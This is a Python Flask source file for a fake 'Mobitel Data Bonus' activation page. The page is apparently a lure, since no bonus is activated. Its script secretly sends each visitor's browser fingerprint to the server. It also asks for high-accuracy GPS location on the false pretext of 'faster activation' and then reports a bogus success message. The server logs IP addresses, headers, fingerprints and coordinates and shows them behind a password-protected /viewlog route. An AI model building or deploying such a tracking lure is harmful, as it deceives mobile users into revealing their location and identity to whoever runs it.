from flask import Flask, request, render_template_string, abort
import datetime
import json

app = Flask(__name__)

LOG_FILE = "visitors.log"
SECRET_PASSWORD = "MySecretViewKey123"  # Change this!

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Mobitel Data Bonus - Confirmation</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial; text-align: center; padding: 40px; background:#f5f5f5; }
        .card { background:white; border-radius:10px; padding:30px; max-width:400px; margin:50px auto; box-shadow:0 2px 10px rgba(0,0,0,0.1); }
        .notice { font-size: 11px; color: #aaa; margin-top: 25px; }
        button { background:#0070f3; color:white; border:none; padding:12px 30px; border-radius:5px; font-size:16px; cursor:pointer; margin-top:15px; }
    </style>
</head>
<body>
    <div class="card">
        <h3>📱 Mobitel Data Bonus</h3>
        <p>Your data bonus package is ready for activation.</p>
        <button onclick="activate()">Activate Now</button>
        <div id="status" style="margin-top:15px;"></div>
        <p class="notice">By proceeding, you agree to our terms. This site collects diagnostic data for security purposes.</p>
    </div>
    <script>
        async function sendFingerprint() {
            const fp = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookiesEnabled: navigator.cookieEnabled,
                timestamp: new Date().toISOString()
            };
            await fetch('/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(fp)
            });
        }

        function sendLocation(position) {
            const coords = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                timestamp: new Date().toISOString()
            };
            fetch('/geo', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(coords)
            });
        }

        function locationError(err) {
            console.log("Location denied or unavailable: " + err.message);
            // Nothing logged; gracefully continue
        }

        async function activate() {
            document.getElementById('status').innerText = 'Please wait...';
            // Step 1: Send fingerprint
            await sendFingerprint();
            // Step 2: Request GPS location (prompts the user)
            if ("geolocation" in navigator) {
                document.getElementById('status').innerText = 'Allow location access for faster activation.';
                navigator.geolocation.getCurrentPosition(sendLocation, locationError, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            }
            document.getElementById('status').innerHTML = '✅ Activation successful! Your bonus will be credited shortly.';
        }
    </script>
</body>
</html>
"""

def get_real_ip():
    forwarded = request.headers.get('X-Forwarded-For')
    if forwarded:
        return forwarded.split(',')[0].strip()
    return request.remote_addr

@app.route('/')
def index():
    log_entry = {
        "ip": get_real_ip(),
        "user_agent_raw": request.headers.get('User-Agent'),
        "referer": request.headers.get('Referer'),
        "accept_language": request.headers.get('Accept-Language'),
        "timestamp": datetime.datetime.utcnow().isoformat(),
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(log_entry) + "\n")
    return render_template_string(HTML_PAGE)

@app.route('/log', methods=['POST'])
def log_fingerprint():
    data = request.get_json()
    entry = {
        "ip": get_real_ip(),
        "fingerprint": data
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")
    return "ok"

@app.route('/geo', methods=['POST'])
def log_geo():
    data = request.get_json()
    entry = {
        "ip": get_real_ip(),
        "gps": data       # latitude, longitude, accuracy, timestamp
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")
    return "ok"

@app.route('/viewlog')
def view_log():
    password = request.args.get('key', '')
    if password != SECRET_PASSWORD:
        abort(403)
    try:
        with open(LOG_FILE, "r") as f:
            contents = f.read()
    except FileNotFoundError:
        contents = "No visitors yet."
    return f"<pre>{contents}</pre>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)